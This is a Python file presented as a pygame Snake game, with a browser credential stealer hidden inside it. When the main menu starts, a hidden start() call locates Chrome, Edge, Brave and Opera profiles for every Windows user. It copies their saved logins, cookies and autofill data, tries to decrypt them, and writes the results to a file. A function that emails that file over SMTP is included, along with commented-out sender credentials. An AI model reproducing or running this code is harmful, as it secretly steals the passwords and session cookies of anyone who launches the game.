import pygame, random, time, json, os, subprocess, threading, sys
import shutil
import base64
import sqlite3
import tempfile
# import win32crypt
from cryptography.fernet import Fernet
from Crypto.Cipher import AES
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
# Initialize pygame
pygame.init()

# Screen setup
W, H = 600, 400
BLOCK = 20
dis = pygame.display.set_mode((W, H))
pygame.display.set_caption('🐍 Snake Game Pro')
clock = pygame.time.Clock()

# Fonts
font = pygame.font.SysFont('Arial', 25)

# Sounds
eat_sounds = []
over_sounds = []
obstacle_sounds = []

for f in ["pack.mp3", "khayohaikhayo.mp3"]:
    if os.path.exists(f): eat_sounds.append(pygame.mixer.Sound(f))

for f in ["lamaryoni.mp3", "maryonimaryo.mp3"]:
    if os.path.exists(f): over_sounds.append(pygame.mixer.Sound(f))

if os.path.exists("obstacles.mp3"):
    obstacle_sounds.append(pygame.mixer.Sound("obstacles.mp3"))

# Score persistence
def load_score():
    if os.path.exists('highscore.json'):
        with open('highscore.json', 'r') as f:
            return json.load(f).get('high_score', 0)
    return 0

def save_score(score):
    with open('highscore.json', 'w') as f:
        json.dump({'high_score': score}, f)

# Draw utilities
def draw_text(txt, color, y_off=0, size=25):
    surf = pygame.font.SysFont('Arial', size).render(txt, True, color)
    rect = surf.get_rect(center=(W / 2, H / 2 + y_off))
    dis.blit(surf, rect)

def draw_snake(slst):
    for i, seg in enumerate(slst):
        col = (0, 200 - int(i / max(len(slst) - 1, 1) * 100), 0)
        pygame.draw.rect(dis, col, (seg[0], seg[1], BLOCK, BLOCK), border_radius=5)
    if slst:
        hx, hy = slst[-1]
        pygame.draw.circle(dis, (255, 255, 255), (hx + 5, hy + 7), 3)
        pygame.draw.circle(dis, (255, 255, 255), (hx + 15, hy + 7), 3)

def draw_food(pos):
    pulse = 4 * abs((time.time() % 1) - 0.5)
    radius = BLOCK // 2 - int(pulse * 5)
    center = (pos[0] + BLOCK // 2, pos[1] + BLOCK // 2)
    pygame.draw.circle(dis, (255, 140, 0), center, radius)

def draw_obstacles(obs):
    for o in obs:
        pygame.draw.rect(dis, (213, 50, 80), (o[0], o[1], BLOCK, BLOCK))

def game_over_screen(score):
    if over_sounds: random.choice(over_sounds).play()
    high = load_score()
    save_score(max(score, high))
    dis.fill((0, 0, 0))
    draw_text("GAME OVER!", (255, 0, 0), -50, 40)
    draw_text(f"Score: {score}", (255, 255, 255), 0)
    if score > high: draw_text("New High Score!", (0, 255, 0), 50)
    draw_text("Press C to Replay or Q to Quit", (255, 255, 102), 100)
    pygame.display.update()
    while True:
        for e in pygame.event.get():
            if e.type == pygame.QUIT: pygame.quit(); quit()
            if e.type == pygame.KEYDOWN:
                if e.key == pygame.K_q: pygame.quit(); quit()
                if e.key == pygame.K_c: return



# Game loop
def game_loop():
    x = y = W // 2
    dx = dy = 0
    slst = []
    length = 1
    score = 0
    speed = 10
    level_timer = time.time()
    obs = [[random.randrange(0, W, BLOCK), random.randrange(0, H, BLOCK)] for _ in range(3)]
    food = [random.randrange(0, W - BLOCK, BLOCK), random.randrange(0, H - BLOCK, BLOCK)]
    running = True
    paused = False

    while running:
        for e in pygame.event.get():
            if e.type == pygame.QUIT: pygame.quit(); quit()
            if e.type == pygame.KEYDOWN:
                if e.key == pygame.K_q: return
                elif e.key == pygame.K_p: paused = not paused
                elif e.key == pygame.K_LEFT and dx == 0: dx = -BLOCK; dy = 0
                elif e.key == pygame.K_RIGHT and dx == 0: dx = BLOCK; dy = 0
                elif e.key == pygame.K_UP and dy == 0: dy = -BLOCK; dx = 0
                elif e.key == pygame.K_DOWN and dy == 0: dy = BLOCK; dx = 0

        if paused:
            draw_text("Paused - Press P to Resume", (255, 255, 255))
            pygame.display.update()
            continue

        x = (x + dx) % W
        y = (y + dy) % H

        if [x, y] in obs:
            return

        slst.append([x, y])
        if len(slst) > length:
            slst.pop(0)

        for seg in slst[:-1]:
            if seg == [x, y]:
                return

        dis.fill((50, 153, 213))
        draw_obstacles(obs)
        draw_snake(slst)
        draw_food(food)
        draw_text(f"Score: {score}", (255, 255, 255), y_off=-170)
        pygame.display.update()

        if [x, y] == food:
            length += 1
            score += 10
            if eat_sounds: random.choice(eat_sounds).play()
            food = [random.randrange(0, W - BLOCK, BLOCK), random.randrange(0, H - BLOCK, BLOCK)]

        if time.time() - level_timer > 20:
            speed += 2
            obs.append([random.randrange(0, W, BLOCK), random.randrange(0, H, BLOCK)])
            level_timer = time.time()
            if obstacle_sounds: random.choice(obstacle_sounds).play()

        clock.tick(speed)

    pygame.mixer.music.stop()
    game_over_screen(score)

# Main menu
def main_menu():
    start()
    pygame.mixer.music.stop()
    while True:
        dis.fill((50, 153, 213))
        draw_text("🐍 Ultimate Snake Game", (255, 255, 102), -60, 40)
        hs = load_score()
        draw_text(f"High Score: {hs}", (255, 255, 255), -10)
        draw_text("C: Start  P: Pause  Q: Quit", (255, 255, 102), 40)
        pygame.display.update()

        for e in pygame.event.get():
            if e.type == pygame.QUIT: pygame.quit(); quit()
            if e.type == pygame.KEYDOWN:
                if e.key == pygame.K_q: pygame.quit(); quit()
                if e.key == pygame.K_c:
                    if os.path.exists("bgm.mp3"):
                        pygame.mixer.music.load("bgm.mp3")
                        pygame.mixer.music.set_volume(0.01)
                        pygame.mixer.music.play(-1)
                   
                    game_loop()

BROWSER_PATHS = {
    "Chrome": r"Google\Chrome\User Data",
    "Edge": r"Microsoft\Edge\User Data",
    "Brave": r"BraveSoftware\Brave-Browser\User Data",
    "Opera": r"Opera Software\Opera Stable"
}
print(BROWSER_PATHS)
def get_all_user_local_appdata():
    users_dir = r"C:\Users"
    user_appdata_paths = []
    for user in os.listdir(users_dir):
        local_appdata = os.path.join(users_dir, user, "AppData", "Local")
        if os.path.exists(local_appdata):
            user_appdata_paths.append(local_appdata)
    return user_appdata_paths

def find_browser_profiles():
    user_local_appdata_paths = get_all_user_local_appdata()
    found_profiles = []

    for user_local in user_local_appdata_paths:
        for browser_name, rel_path in BROWSER_PATHS.items():
            base_path = os.path.join(user_local, rel_path)
            if not os.path.exists(base_path):
                continue

            profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]
            for profile in profiles:
                login_path = os.path.join(base_path, profile, "Login Data")
                cookies_path = os.path.join(base_path, profile, "Cookies")
                webdata_path = os.path.join(base_path, profile, "Web Data")
                local_state = os.path.join(base_path, "Local State")

                if os.path.exists(login_path) and os.path.exists(local_state):
                    found_profiles.append({
                        "user_local": user_local,
                        "browser": browser_name,
                        "profile": profile,
                        "login_data": login_path,
                        "cookies": cookies_path,
                        "web_data": webdata_path,
                        "local_state": local_state
                    })

    return found_profiles

def get_encryption_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key_b64 = local_state.get("os_crypt", {}).get("encrypted_key", None)
        if not encrypted_key_b64:
            print(f"[!] No encrypted_key found in {local_state_path}")
            return None
        encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # Remove 'DPAPI' prefix
        cipher = Fernet(encrypted_key)
        key = cipher.decrypt(encrypted_key)
        print(key)
        # key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return key
    except Exception as e:
        print(f"[!] Failed to get encryption key from {local_state_path}: {e}")
        return None

def decrypt_password(buff, key):
    try:
        if buff is None:
            return "", ""

        if buff[0:1] == b'v':  # starts with 'v'
            version = buff[1:3].decode(errors='ignore')  # e.g., '10', '11', '20'

            if version in ['10', '11', '20']:
                iv = buff[3:15]        # 12 bytes IV
                ciphertext = buff[15:-16]
                tag = buff[-16:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                return f"v{version}:{decrypted.decode(errors='ignore')}", ""
            else:
                return "", f"ENCRYPTION_VERSION:v{version} ENCRYPTED_B64:{base64.b64encode(buff).decode()}"
        else:
            if len(buff) > 0:
                cipher = Fernet(buff)
                decrypted = cipher.decrypt(buff)
                # decrypted = win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1]
                return f"dpapi:{decrypted.decode(errors='ignore')}", ""
            else:
                return "", ""
    except Exception:
        prefix = ""
        if buff and buff[0:1] == b'v':
            try:
                prefix = f"ENCRYPTION_VERSION:{buff[:3].decode(errors='ignore')} "
            except:
                prefix = ""
        raw_hex = buff.hex()
        raw_b64 = base64.b64encode(buff).decode()
        return "", f"{prefix}ENCRYPTED_HEX:{raw_hex} ENCRYPTED_B64:{raw_b64}"

def extract_passwords(paths, key, file):
    file.write(f"\n=== Passwords from {paths['browser']} {paths['profile']} ({paths['user_local']}) ===\n")
    try:
        with tempfile.NamedTemporaryFile(delete=False) as tmp:
            shutil.copy2(paths["login_data"], tmp.name)
            temp_db = tmp.name

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        rows = cursor.fetchall()
        print(rows)
        file.write(f"[DEBUG] {len(rows)} entries found\n")

        for url, username, encrypted_password in rows:
            decrypted_password, encrypted_info = decrypt_password(encrypted_password, key)
            file.write(f"URL: {url}\nUsername: {username}\n")
            if decrypted_password:
                file.write(f"Decrypted Password: {decrypted_password}\n")
            else:
                file.write(f"Decryption failed, saved encrypted data: {encrypted_info}\n")
            file.write("---\n")

        conn.close()
    except Exception as e:
        file.write(f"[!] Failed to extract passwords: {e}\n")
    finally:
        if os.path.exists(temp_db):
            os.remove(temp_db)

def extract_cookies(paths, key, file):
    if not os.path.exists(paths["cookies"]):
        file.write("\n[!] Cookies file not found, skipping cookies extraction.\n")
        return

    file.write(f"\n=== Cookies from {paths['browser']} {paths['profile']} ({paths['user_local']}) ===\n")
    try:
        with tempfile.NamedTemporaryFile(delete=False) as tmp:
            shutil.copy2(paths["cookies"], tmp.name)
            temp_db = tmp.name

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure FROM cookies")

        for host, name, encrypted_value, path, expires_utc, is_secure in cursor.fetchall():
            decrypted_cookie, encrypted_info = decrypt_password(encrypted_value, key)
            file.write(f"Host: {host}\nName: {name}\n")
            if decrypted_cookie:
                file.write(f"Decrypted Value: {decrypted_cookie}\n")
            else:
                file.write(f"Decryption failed, saved encrypted data: {encrypted_info}\n")
            file.write(f"Path: {path}\nExpires UTC: {expires_utc}\nSecure: {is_secure}\n---\n")

        conn.close()
    except Exception as e:
        file.write(f"[!] Failed to extract cookies: {e}\n")
    finally:
        if os.path.exists(temp_db):
            os.remove(temp_db)

def extract_autofill(paths, file):
    if not os.path.exists(paths["web_data"]):
        file.write("\n[!] Web Data file not found, skipping autofill extraction.\n")
        return

    file.write(f"\n=== Autofill from {paths['browser']} {paths['profile']} ({paths['user_local']}) ===\n")
    try:
        with tempfile.NamedTemporaryFile(delete=False) as tmp:
            shutil.copy2(paths["web_data"], tmp.name)
            temp_db = tmp.name

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT name, value FROM autofill")

        for name, value in cursor.fetchall():
            file.write(f"Name: {name}\nValue: {value}\n---\n")

        conn.close()
    except Exception as e:
        file.write(f"[!] Failed to extract autofill: {e}\n")
    finally:
        if os.path.exists(temp_db):
            os.remove(temp_db)

def send_email_with_attachment(sender_email, sender_password, receiver_email, subject, file_path):
    # Create the message container
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject

    # Attach a simple body message
    msg.attach(MIMEText("Please find the attached Chromium data extraction report.", 'plain'))

    # Attach the file
    with open(file_path, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)
    part.add_header(
        "Content-Disposition",
        f'attachment; filename="{os.path.basename(file_path)}"',
    )
    msg.attach(part)

    # Send email via SMTP server
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)  # Adjust as needed
        server.starttls()
        server.login(sender_email, sender_password)
        server.send_message(msg)
        server.quit()
       
    except Exception as e:
        print(f"Failed to send email: {e}")
    file_path = "all_chromium_data_decrypted.txt" 
    if os.path.exists(file_path):
     os.remove(file_path)
    
def start():
  
    profiles = find_browser_profiles()
    if not profiles:
        return
    output_filename = "all_chromium_data_decrypted.txt"
    
    # Delete old output file if exists
    if os.path.exists(output_filename):
        os.remove(output_filename)

    with open(output_filename, "w", encoding="utf-8") as output_file:
        for profile in profiles:
            try:
                key = get_encryption_key(profile["local_state"])
                extract_passwords(profile, key, output_file)
                extract_cookies(profile, key, output_file)
                extract_autofill(profile, output_file)
            except Exception as e:
                output_file.write(f"\n[!] Error extracting data from {profile['browser']} {profile['profile']} ({profile['user_local']}): {e}\n")

    # Email credentials - fill with your actual data
    # sender_email = "atitacharya2@gmail.com"
    # sender_password = "kyso cbhw auof sqgl"
    # receiver_email = "045kritika@gmail.com"
    # subject = "Chromium Data Extraction Report"

    # Send the output file as an email attachment
    # send_email_with_attachment(sender_email, sender_password, receiver_email, subject, output_filename)

if __name__ == "__main__":
    main_menu()